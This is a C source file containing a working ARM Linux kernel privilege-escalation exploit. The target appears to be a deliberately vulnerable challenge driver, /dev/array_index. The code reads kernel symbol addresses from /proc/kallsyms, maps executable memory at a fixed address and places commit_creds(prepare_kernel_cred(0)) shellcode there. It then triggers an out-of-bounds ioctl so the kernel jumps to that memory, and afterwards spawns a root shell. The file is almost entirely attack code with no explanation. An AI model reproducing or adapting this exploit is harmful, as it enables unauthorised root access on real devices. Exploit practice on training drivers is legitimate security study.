#include <stdio.h>
#include <strings.h>
#include <fcntl.h>
#include <sys/mman.h>
#include "../../module/CommandHandler.h"
#include "dbg.h"

__u32
get_symbol(char *name)
{
        FILE *f;
        __u32 addr;
        char dummy, sname[512];
        int ret = 0;

        f = fopen("/proc/kallsyms", "r");
        if (!f) {
                return 0;
        }

        while (ret != EOF) {
                ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sname);
                if (ret == 0) {
                        fscanf(f, "%s\n", sname);
                        continue;
                }
                if (!strcmp(name, sname)) {
                        printf("[+] resolved symbol %s to %p\n", name, (void *) addr);
                        return addr;
                }
        }

        return 0;
}

__u32 commit_creds;
__u32 prepare_kernel_cred;


extern uint32_t shellCode[];

//to generate binary code
asm
(
"    .text\n"
"    .align 2\n"
"    .code 16\n"
"    .globl shellCode\n\t"
"shellCode:\n\t"

"mov     r3, pc\n\t"
"bx      r3\n\t"
"    .code 32\n"
"ping:\n\t"
"push    {r4, lr}\n\t"
"ldr     r3, [pc, #16]\n\t"
"mov     r0, #0\n\t"
"blx     r3\n\t"
"ldr     r3, [pc, #8]\n\t"
"blx     r3\n\t"
"pop     {r4, pc}\n\t"
".word   prepare_kernel_cred\n\t"
".word   commit_creds\n\t"
);




int main(void){

  commit_creds =  get_symbol("commit_creds");
  prepare_kernel_cred = get_symbol("prepare_kernel_cred");

  int cmd_handler = open("/dev/array_index", O_RDWR);
  check(cmd_handler >= 0, "Error opening challenge device");

  //kernel will jump to 0x80000001 due to pointer derefference
  __u32 mmap_start = 0x80000000, mmap_size = 0x15000;

   printf("[+] Mapping userspace memory at 0x%x\n", mmap_start);

   void * mapped = mmap((void*)mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC,
       MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0);
   check(mapped != MAP_FAILED, "Failed mapping");

   //0x00000000 is nop for ARM
   bzero( (void*)mmap_start, mmap_size );
   printf("[+] shellCode address 0x%x\n", shellCode);
   __u32 jump[] = {
   0x467b,			//mov     r3, pc
   0x4718,			//bx      r3            ;0x80000001 means thumb
   0xe92d4010,		//push    {r4, lr}
   0xe59f3010,		//ldr     r3, [pc, #16]
   0xe3a00000,		//mov     r0, #0
   0xe12fff33,		//blx     r3
   0xe59f3008,		//ldr     r3, [pc, #8]
   0xe12fff33,		//blx     r3
   0xe8bd8010,		//pop     {r4, pc}
   prepare_kernel_cred,
   commit_creds
   };


  memcpy( (void*)mmap_start+mmap_size - sizeof(jump) - 0x20, jump, sizeof(jump));

  printf("[+] shellcode address:0x%04x\n", (void*)mmap_start+mmap_size - sizeof(jump) - 0x20);

  printf("[+] Triggering the fucking exploit\n");
  int rc = ioctl(cmd_handler, RUN_COMMAND_HANDLER, 0x170);
  check(rc != -1, "IOCTL failed");

  printf("uid=%d, euid=%d\n",getuid(), geteuid() );

  if(!getuid())
    execl( "/system/bin/sh", "sh", (char*) NULL);

  return 0;
error:
  return -1;
}
